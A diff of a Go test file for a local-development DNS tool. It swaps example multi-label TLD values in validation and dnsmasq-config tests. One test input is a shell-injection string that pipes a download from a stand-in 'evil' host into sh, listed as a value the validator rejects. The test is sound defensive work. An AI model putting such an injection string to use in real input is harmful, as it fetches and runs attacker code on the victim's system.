@@ -240,7 +240,7 @@ func TestConfiguredTLD_rejectsAnythingThatIsNotADNSLabel(t *testing.T) {
 		"test", "dev", "local8", "my-tld", "x",
 		// Multi-label suffixes are usable: the rest of lerd already appends
 		// dns.tld verbatim to build site domains, vhosts and certificate SANs.
-		"lerd.test", "l.mb01.example.dev", "internal.example.com", "a.b.c.d.e",
+		"lerd.test", "lab.example.dev", "internal.example.com", "a.b.c.d.e",
 	} {
 		if !ValidTLD(good) {
 			t.Errorf("ValidTLD rejected the usable TLD %q", good)
@@ -252,7 +252,7 @@ func TestConfiguredTLD_rejectsAnythingThatIsNotADNSLabel(t *testing.T) {
 // single-label check, so the writer emitted the default while every reader looked
 // for the configured value and the diagnostic could never pass.
 func TestWriteDnsmasqConfig_honoursMultiLabelTLD(t *testing.T) {
-	writeGlobalConfig(t, "dns:\n  enabled: true\n  tld: l.mb01.example.dev\n")
+	writeGlobalConfig(t, "dns:\n  enabled: true\n  tld: lab.example.dev\n")
 
 	dir := t.TempDir()
 	if err := WriteDnsmasqConfigFor(dir, "127.0.0.1"); err != nil {
@@ -260,7 +260,7 @@ func TestWriteDnsmasqConfig_honoursMultiLabelTLD(t *testing.T) {
 	}
 	content := readGlobalFile(t, filepath.Join(dir, "lerd.conf"))
 
-	assertContains(t, content, "address=/.l.mb01.example.dev/127.0.0.1")
+	assertContains(t, content, "address=/.lab.example.dev/127.0.0.1")
 	if strings.Contains(content, "address=/.test/") {
 		t.Errorf("configured TLD was replaced by the default, got:\n%s", content)
 	}
@@ -272,7 +272,7 @@ func TestConfiguredTLD_writerEmitsWhatTheDiagnosticLooksFor(t *testing.T) {
 	for _, tld := range []string{
 		"test",
 		"lerd.test",
-		"l.mb01.example.dev",
+		"lab.example.dev",
 		`bad'; curl http://evil/x | sh; #`, // rejected, so both sides must see the default
 		"a..b",                             // rejected for an empty label
 	} {
